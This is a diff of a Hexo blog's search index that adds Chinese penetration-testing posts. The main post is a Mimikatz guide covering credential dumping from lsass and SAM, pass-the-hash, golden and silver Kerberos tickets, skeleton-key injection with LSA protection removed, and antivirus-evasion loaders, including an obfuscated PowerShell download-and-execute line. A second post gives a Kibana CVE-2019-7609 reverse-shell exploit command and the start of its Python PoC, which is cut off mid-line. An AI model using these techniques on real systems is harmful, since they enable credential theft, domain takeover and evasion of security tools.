+        <tag>-Web漏洞 -未授权访问 -Memcached</tag>
       </tags>
   </entry>
   <entry>
@@ -1942,6 +1706,242 @@
       </categories>
       <tags>
         <tag>-数据查询 -ODAT -开放数据协议</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Mimikatz运行姿势</title>
+    <url>/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/</url>
+    <content><![CDATA[<h1 id="Mimikatz运行姿势"><a href="#Mimikatz运行姿势" class="headerlink" title="Mimikatz运行姿势"></a>Mimikatz运行姿势</h1><hr>
+<p>上篇文章记录了Mimikatz神器的基本命令和很多模块的使用方法命令。由于在实际环境中可能会产生不同的问题，这篇文章记录学习Mimikatz工具的使用姿势和一些免杀方法。</p>
+<h2 id="获取本地账户密码"><a href="#获取本地账户密码" class="headerlink" title="获取本地账户密码"></a>获取本地账户密码</h2><hr>
+<h3 id="本地执行"><a href="#本地执行" class="headerlink" title="本地执行"></a>本地执行</h3><p>首先将执行权限提升为debug权限</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">privilege::debug</span><br></pre></td></tr></table></figure>
+
+<img src="/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103103351984.png" class title="image-20211103103351984">
+
+
+
+<p>使用sekurlsa模块抓取明文密码</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure>
+
+<img src="/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103103420451.png" class title="image-20211103103420451">
+
+
+
+<p>注:当目标为win10或2012R2以上时，默认禁止在内存中保存明文密码，但可以通过修改注册表的方式来抓取明文。</p>
+<p>修改命令如下:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">reg add HKLM\SYSTEM\CurrentControlSet\Control\Sec urityProviders\WDigest  /v UseLogonCredential /t REG_DWORD  /d  1  /f</span><br></pre></td></tr></table></figure>
+
+<img src="/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103105046333.png" class title="image-20211103105046333">
+
+
+
+<h3 id="SAM表离线获取hash"><a href="#SAM表离线获取hash" class="headerlink" title="SAM表离线获取hash"></a>SAM表离线获取hash</h3><p>导出SAM数据库的数据</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">reg  save  HKLM\SYSTEM  SYSTEM(自定义名称)</span><br><span class="line"></span><br><span class="line">reg  save  HKLM\SAM SAM(自定义名称)</span><br></pre></td></tr></table></figure>
+
+<img src="/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103110249663.png" class title="image-20211103110249663">
+
+
+
+<p>提取导出SAM数据中的hash(确保Mimikatz和导出文件在同一目录下或者指定SAM数据的绝对&#x2F;相对路径)</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lsadump::sam /sam:SAM(自定义名称)  /system:SYSTEM(自定义名称)</span><br></pre></td></tr></table></figure>
+
+<img src="/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103110638898.png" class title="image-20211103110638898">
+
+
+
+<h2 id="Procdump-Mimikatz"><a href="#Procdump-Mimikatz" class="headerlink" title="Procdump+Mimikatz"></a>Procdump+Mimikatz</h2><hr>
+<p>当mimikatz无法在目标主机上正常运行时，可以使用微软提供的工具Procdump导出lsass.exe进程</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">procsump64.exe -accepteula -ma lsass.exe  lsass.tmp</span><br></pre></td></tr></table></figure>
+
+<img src="/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103111347692.png" class title="image-20211103111347692">
+
+
+
+<p>使用 mimikatz的sekurlsa模块对导出的lsass.dmp文件。先使用minidump恢复到lsass.exe的状态，然后使用logonpasswords导出明文密码信息</p>
+<img src="/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103113844380.png" class title="image-20211103113844380">
+
+
+
+<p>可看到passwords.txt文档中系统的明文密码信息</p>
+<img src="/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103115851943.png" class title="image-20211103115851943">
+
+
+
+<h2 id="哈希传递攻击PTH"><a href="#哈希传递攻击PTH" class="headerlink" title="哈希传递攻击PTH"></a>哈希传递攻击PTH</h2><hr>
+<h3 id="工作组环境"><a href="#工作组环境" class="headerlink" title="工作组环境"></a>工作组环境</h3><p>当我们获取到某一台主机中用户的NTLM哈希值时，可以直接将获取到的NTLM哈希值登录目标主机</p>
+<p>命令；</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sekurlsa:pt /user:用户名   /domain:ip地址    /ntlm:用户的ntlm哈希值</span><br></pre></td></tr></table></figure>
+
+<p>如下所示，我们可以直接登录目标主机cmd管理窗口，执行命令</p>
+<img src="/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103130911394.png" class title="image-20211103130911394">
+
+<p>注：只能在 mimikatz 弹出的 cmd 窗口才可以执行这些操作，注入成功后，可以使用psexec、wmic、wmiexec等实现远程执行命令</p>
+<h3 id="域环境"><a href="#域环境" class="headerlink" title="域环境"></a>域环境</h3><p>在域环境下，如果获取到某一用户的ntlm哈希值，可以在域环境下任意主机登录用户，若获取到域控 管理员的账号和ntlm哈希值即可 登录域控。</p>
+<p>命令:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sekurlsa:pth  /user:用户  /domain:&quot;域名&quot;  /ntlm:用户ntlm哈希值</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="票据传递攻击"><a href="#票据传递攻击" class="headerlink" title="票据传递攻击"></a>票据传递攻击</h2><hr>
+<h3 id="黄金票据"><a href="#黄金票据" class="headerlink" title="黄金票据"></a>黄金票据</h3><p>在域环境下，每个用户的ticcket都是由krbtgt的密码NTLM哈希进行加密传输的，只要获取到krbtgt用户的密码NTLM哈希值就可以随意伪造Ticket，从而使用Ticket登录域控，使用krbtgt用户密码HTLM哈希生成的票据为黄金票据</p>
+<p>首先获取krbtft用户的NTLM哈希值</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mimikatz  &quot;lsamdump::dcsync  /domain:xxx.com  /user:krbtgt&quot;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>利用mimikatz生成域管理员权限的黄金票据，输入域管理员对应的账号，域名称和sid值</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kerberos::golden /admin:administrator /domain:xxx.COM /sid:管理员SID值 /krbtgt:krbtgt用户的哈希值 /ticket:test.kiribi(生成的票据)</span><br></pre></td></tr></table></figure>
+
+
+
+<p>导出上面生成的票据</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kerberos::ptt  test.kiribi</span><br></pre></td></tr></table></figure>
+
+
+
+<p>查看导入后获取的域管权限，查看主机的目录</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dir  \\$DC$.xxx.com\c$</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="白银票据"><a href="#白银票据" class="headerlink" title="白银票据"></a>白银票据</h3><p>白银票据是伪造 TGS(票据授权服务)，只能访问指定的服务，由客户端计算机账号的NTLM哈希值进行加密。</p>
+<p>下面使用白银票据伪造CIFS(用于Windows主机之间进行网络文件共享)服务权限</p>
+<p>提升权限，获取主机账号的哈希值</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line"></span><br><span class="line">sekurlsa::logonpasswords</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<img src="/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103161547663.png" class title="image-20211103161547663">
+
+<p>这里的liukaifeng01的SID为S-1-5-21-295270202-1353902439-2381782089(不要后面的-1000)</p>
+<p>伪造的OWA的NTLM哈希为84883cf100e1f84e2a2468f08d6d0e4f</p>
+<img src="/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103162043108.png" class title="image-20211103162043108">
+
+
+
+<p>生成白银票据命令 :</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kerberos::golden /domain:[domain] /sid:[SID] /target:服务用户.xxx.com /rc4:[server&#x27;s Hash] /service:[service] /user:[username] /ptt</span><br></pre></td></tr></table></figure>
+
+
+
+<p>如下:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kerberos::golden /domain:GOD /sid:S-1-5-21-295270202-1353902439-2381782089( /target:OWA.GOD.com /rc4:84883cf100e1f84e2a2468f08d6d0e4f /service:cifs /user:liukaifeng01 /ptt</span><br></pre></td></tr></table></figure>
+
+<img src="/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103162850526.png" class title="image-20211103162850526">
+
+<p>可以看到此时的liukaifeng01的key变成了OWA的，服务为cifs，生成了获取cifs的白银票据</p>
+<p>伪造白银票据后，我们就可以远程访问DC</p>
+<img src="/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103163128580.png" class title="image-20211103163128580">
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">注:若使用dir \\主机名\c$不能访问，则输入主机全名dir \\主机名.域名.com\c$</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="万能密钥"><a href="#万能密钥" class="headerlink" title="万能密钥"></a>万能密钥</h3><p>skeleton key(万能钥匙)就是给所有域内用户添加一个相同的密码，域内所有的用户 都可以使用这个密码进行认证，同时原始密码也可以使用，其原理是对 lsass.exe 进行注 入，所以重启后会失效</p>
+<p>在域控上安装skeleton key</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mimikatz.exe privilege::debug &quot;misc::skeleton&quot;</span><br></pre></td></tr></table></figure>
+
+<img src="/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103171351475.png" class title="image-20211103171351475">
+
+
+
+<p>在域内其他机器使用skeleton key去访问域控，添加密码围殴mimikatz</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net  use   \\主机名.xxx.com\c$  mimikatz(密码)  /user:adtest \administrator</span><br></pre></td></tr></table></figure>
+
+
+
+<p>微软在 2014 年 3 月 12 日添加了 LSA 爆护策略，用来防止对进程 lsass.exe 的代码注入。如果直接尝试添加 skelenton key 会失败。</p>
+<p>但mimikatz依然可以绕过，需要导入mimidrv.sys文件，命令如下:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">!+</span><br><span class="line">!processprotect /process:lsass.exe /remove </span><br><span class="line">misc::skeleton</span><br></pre></td></tr></table></figure>
+
+<img src="/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103172059633.png" class title="image-20211103172059633">
+
+
+
+<h2 id="免杀处理"><a href="#免杀处理" class="headerlink" title="免杀处理"></a>免杀处理</h2><hr>
+<h3 id="Invoke-Mimikatz"><a href="#Invoke-Mimikatz" class="headerlink" title="Invoke-Mimikatz"></a>Invoke-Mimikatz</h3><p>在powershell中导入invoke-Mimikatz.ps1，加载mimikatz模块</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">powershell -exec bypass “import-module .Invoke-Mimikatz.ps1”</span><br></pre></td></tr></table></figure>
+
+<p>运行mimikazt模块</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">powershell -exec bypass “invoke-Mimikatz”</span><br></pre></td></tr></table></figure>
+
+<img src="/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103194723187.png" class title="image-20211103194723187">
+
+<p>在cmd中运行过程中没有被拦截</p>
+<p>使用poweshell加载远程服务器的ps脚本，会被360拦截</p>
+<img src="/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103200143717.png" class title="image-20211103200143717">
+
+
+
+<p>稍微做了简单的混淆</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">powershell -c &quot; (&#x27;IEX &#x27;+&#x27;(Ne&#x27;+&#x27;w-O&#x27;+&#x27;bject Ne&#x27;+&#x27;t.W&#x27;+&#x27;ebClien&#x27;+&#x27;t).Do&#x27;+&#x27;wnloadS&#x27;+&#x27;trin&#x27;+&#x27;g&#x27;+&#x27;(&#x27;+&#x27;1vchttp://&#x27;+&#x27;192.168.211&#x27;+&#x27;.1/&#x27;+&#x27;Inv&#x27;+&#x27;oke-Mimik&#x27;+&#x27;a&#x27;+&#x27;tz.&#x27;+&#x27;ps11v&#x27;+&#x27;c)&#x27;+&#x27;;&#x27;+&#x27;I&#x27;+&#x27;nvoke-Mimika&#x27;+&#x27;tz&#x27;).REplaCE(&#x27;1vc&#x27;,[STRing][CHAR]39)|IeX&quot;</span><br></pre></td></tr></table></figure>
+
+<p>还是被拦截</p>
+<img src="/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103200627835.png" class title="image-20211103200627835">
+
+<img src="/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103200702681.png" class title="image-20211103200702681">
+
+
+
+<p>所以最好将Invoke-Mimikatz.ps1文件放置在目标主机上执行powershell加载模块运行imikatz</p>
+<h3 id="使用-net2-0"><a href="#使用-net2-0" class="headerlink" title="使用.net2.0"></a>使用.net2.0</h3><p>首先下载<a href="https://raw.githubusercontent.com/ssssanr/Mimikatz-Csharp/master/katz.cs">katz.cs</a>，将katz.cs文件保存到本地</p>
+<p>并放在对应的系统版本的Framework目录中</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">32位：C:\Windows\Microsoft.NET\Framework\v2.0.50727</span><br><span class="line">64位：C:\Windows\Microsoft.NET\Framework64\v2.0.50727</span><br></pre></td></tr></table></figure>
+
+
+
+<p>然后在powershell中执行命令生成key.snk</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$key=&#x27;BwIA AAAkAABSU0EyAAQAAAEAAQBhXtvkSeH85E31z 6 4cAX+X2PWGc6DHP9VaoD13CljtYau9SesUzKVLJdHphY5ppg5cl HIGaL7nZbp6qukLH0lLEq/vW979GWzVAgSZaGVCFpuk6p1y69cSr3STlzljJrY76JIjeS4+RhbdWHp99y8QhwRllOC0qu/WxZaffHS2te/PKzIiTuFfcP46qxQoLR8s3QZhAJBnn9TGJkbix8MTgEt7hD1DC2hXv7dKaC531ZWqGXB54OnuvFbD5P2t+vyvZuHNmAy3pX0BDXqwEfoZZ+hiIk1YUDSNOE79zwnpVP1+BN0PK5QCPCS+6zujfRlQpJ+nfHLLicweJ9uT7OG3g/P+JpXGN0/+Hitolufo7Ucjh+WvZAU//dzrGny5stQtTmLxdhZbOsNDJpsqnzwEUfL5+o8OhujBHDm/ZQ0361mVsSVWrmgDPKHGGRx+7FbdgpBEq3m15/4zzg343V9NBwt1+qZU+TSVPU0wRvkWiZRerjmDdehJIboWsx4V8aiWx8FPPngEmNz89tBAQ8zbIrJFfmtYnj1fFmkNu3lglOefcacyYEHPX/tqcBuBIg/cpcDHps/6SGCCciX3tufnEeDMAQjmLku8X4zHcgJx6FpVK7qeEuvyV0OGKvNor9b/WKQHIHjkzG+z6nWHMoMYV5VMTZ0jLM5aZQ6ypwmFZaNmtL6KDzKv8L1YN2TkKjXEoWulXNliBpelsSJyuICplrCTPGGSxPGihT3rpZ9tbLZUefrFnLNiHfVjNi53Yg4=&#x27;</span><br><span class="line"></span><br><span class="line">$Content = [System.Convert]::FromBase64String($key)</span><br><span class="line"></span><br><span class="line">Set-Content key.snk -Value $Content -Encoding Byte</span><br></pre></td></tr></table></figure>
+
+<img src="/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103202206247.png" class title="image-20211103202206247">
+
+
+
+<p>最后生成mimikatz，在运行mimikatz</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">32位:</span><br><span class="line">C:\Windows\Microsoft.NET\Framework\v2.0.50727&gt;.\csc.exe /r:System.EnterpriseServices.dll /out:katz.exe /keyfile:key.snk /unsafe katz.cs C:\Windows\Microsoft.NET\Framework\v2.0.50727&gt;.\regsvcs.exe katz.exe</span><br><span class="line"></span><br><span class="line">64位:</span><br><span class="line">C:\Windows\Microsoft.NET\Framework64\v2.0.5072 7&gt;.\csc.exe /r:System.EnterpriseServices.dll /out:katz.exe /keyfile:key.snk /unsafe katz.cs C:\Windows\Microsoft.NET\Framework64\v2.0.50727&gt;.\regsvcs.exe katz.exe</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<p>在运行时被360发现啦，火绒没有反应</p>
+<img src="/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103202433218.png" class title="image-20211103202433218">
+
+
+
+<h3 id="使用-net4-0"><a href="#使用-net4-0" class="headerlink" title="使用.net4.0"></a>使用.net4.0</h3><p>下载[mimikatz.xml](<a href="https://raw.githubusercontent.com/3gstudent/msbuild-inline-task/master/executes">https://raw.githubusercontent.com/3gstudent/msbuild-inline-task/master/executes</a> mimikatz.xml)，将其保存在Framework64文件下的v4,0文件下并运行</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msbuild.exe mimikatz.xml</span><br></pre></td></tr></table></figure>
+
+<img src="/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103203026847.png" class title="image-20211103203026847">
+
+<p>360和火绒都没有报毒和进行拦截</p>
+<h3 id="js加载mimikatz"><a href="#js加载mimikatz" class="headerlink" title="js加载mimikatz"></a>js加载mimikatz</h3><p>下载<a href="https://gist.github.com/500646/14051b27b45dce37818aca915e93062f/raw/2adcc9d2570b4367c6cc405e5a5969863d04fc9b/katz.js">katz.js</a>，执行</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">scsript mimikatz.js</span><br></pre></td></tr></table></figure>
+
+<img src="/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103204511543.png" class title="image-20211103204511543">
+
+
+
+<img src="/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103204537821.png" class title="image-20211103204537821">
+
+<p>360拦截了，火绒没绕过</p>
+<h3 id="jscript的xsl版"><a href="#jscript的xsl版" class="headerlink" title="jscript的xsl版"></a>jscript的xsl版</h3><p>本地加载mimikatz.xsl文件</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wmic os get /format:&quot;mimikatz.xsl&quot;</span><br></pre></td></tr></table></figure>
+
+<img src="/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103204250467.png" class title="image-20211103204250467">
+
+<p>360和火绒都没有拦截</p>
+<h2 id="Others"><a href="#Others" class="headerlink" title="Others"></a>Others</h2><hr>
+<h3 id="导出chrome中的密码"><a href="#导出chrome中的密码" class="headerlink" title="导出chrome中的密码"></a>导出chrome中的密码</h3><p><a href="https://mp.weixin.qq.com/s?__biz=MzIzOTg0NjYzNg==&mid=2247483949&idx=1&sn=db4853c88e4bf0a550c095d9017a363c&chksm=e92297aede551eb815a604ba944c4666b260c5bfe044e1b3a60946b586fd5679e29db0adf18d&mpshare=1&scene=23&srcid=&sharer_sharetime=1582350092849&sharer_shareid=d32981e13d51bf06188894426d2a54e5#rd">使用mimikatz导出chrome中的密码 (qq.com)</a></p>
+<h3 id="隐藏功能"><a href="#隐藏功能" class="headerlink" title="隐藏功能"></a>隐藏功能</h3><p>管理员常常会禁用一些重要程序的运行，比如cmd、regedit、taskmgr，此时不方便渗透的进一步进行，这里除了去改回原来的配置，还可以借助mimikatz的一些功能：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Copyprivilege::debug</span><br><span class="line">misc::cmd</span><br><span class="line">misc::regedit</span><br><span class="line">misc::taskmgr</span><br></pre></td></tr></table></figure>
+
+
+
+]]></content>
+      <categories>
+        <category>内网渗透</category>
+        <category>渗透工具</category>
+      </categories>
+      <tags>
+        <tag>-内网渗透 -工具使用 -免杀处理</tag>
       </tags>
   </entry>
   <entry>
@@ -2662,30 +2662,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Hello World</title>
-    <url>/2021/09/14/hello-world/</url>
-    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
-]]></content>
-      <categories>
-        <category>内网渗透</category>
-      </categories>
-      <tags>
-        <tag>-博客测试</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>git用法小记</title>
     <url>/2022/01/23/git%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/</url>
     <content><![CDATA[<h1 id="git常用命令"><a href="#git常用命令" class="headerlink" title="git常用命令"></a>git常用命令</h1><hr>
@@ -2742,6 +2718,87 @@
       </categories>
       <tags>
         <tag>-git语法 -git仓库</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Hello World</title>
+    <url>/2021/09/14/hello-world/</url>
+    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
+<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
+<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
+<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
+<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
+]]></content>
+      <categories>
+        <category>内网渗透</category>
+      </categories>
+      <tags>
+        <tag>-博客测试</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>kibana未授权访问利用</title>
+    <url>/2021/11/25/kibana%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%A9%E7%94%A8/</url>
+    <content><![CDATA[<h1 id="kibana未授权访问利用"><a href="#kibana未授权访问利用" class="headerlink" title="kibana未授权访问利用"></a>kibana未授权访问利用</h1><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>Kibana如果允许外网访问，没有做安全的登录认证，也会被外部随意访问查看所有的数据，造成少数据泄露。在默认配置下，Kibana就可以访问<a href="https://so.csdn.net/so/search?from=pc_blog_highlight&q=Elasticsearch">Elasticsearch</a>中的所有数据。</p>
+<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Kibana &lt; 5.6.15</p>
+<p>Kibana &lt; 6.6.1</p>
+<h2 id="搜索规则"><a href="#搜索规则" class="headerlink" title="搜索规则"></a>搜索规则</h2><p>zoomeye:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">app:&quot;kibana&quot;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>Fofa:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">app=&quot;kibana&quot;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>直接访问kibana系统</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://192.168.211.129:5601/app/kibana</span><br></pre></td></tr></table></figure>
+
+
+
+<p>无需账号密码就可以登录进入图形化界面</p>
+<img src="/2021/11/25/kibana%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%A9%E7%94%A8/image-20211125150723328.png" class title="image-20211125150723328">
+
+
+
+<p>下面利用脚本进行攻击</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python CVE-2019-7609-kibana-rce.py -u 目标主机ip地址:5601 -host 攻击主机ip地址 -port 监听端口 –-shell</span><br></pre></td></tr></table></figure>
+
+<img src="/2021/11/25/kibana%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%A9%E7%94%A8/image-20211125162717040.png" class title="image-20211125162717040">
+
+
+
+<p>反弹shell成功</p>
+<img src="/2021/11/25/kibana%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%A9%E7%94%A8/image-20211125162801162.png" class title="image-20211125162801162">
+
+
+
+<h2 id="漏洞POC"><a href="#漏洞POC" class="headerlink" title="漏洞POC"></a>漏洞POC</h2><p>poc地址 :</p>
+<p><a href="https://github.com/LandGrey/CVE-2019-7609">LandGrey&#x2F;CVE-2019-7609: exploit CVE-2019-7609(kibana RCE) on right way by python2 scripts (github.com)</a></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"><span class="comment"># Build By LandGrey</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> traceback</span><br><span class="line"><span class="keyword">from</span> distutils.version <span class="keyword">import</span> StrictVersion</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_kibana_version</span>(<span class="params">url</span>):</span></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&#x27;Referer&#x27;</span>: url,</span><br><span class="line">        <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0&#x27;</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    url = <span class="string">&quot;&#123;&#125;&#123;&#125;&quot;</span>.<span class="built_in">format</span>(url.rstrip(<span class="string">&quot;/&quot;</span>), <span class="string">&quot;/app/kibana&quot;</span>)</span><br><span class="line">    r = requests.get(url, verify=<span class="literal">False</span>, headers=headers, timeout=<span class="number">30</span>)</span><br><span class="line">    patterns = [<span class="string">&#x27;&amp;quot;version&amp;quot;:&amp;quot;(.*?)&amp;quot;,&#x27;</span>, <span 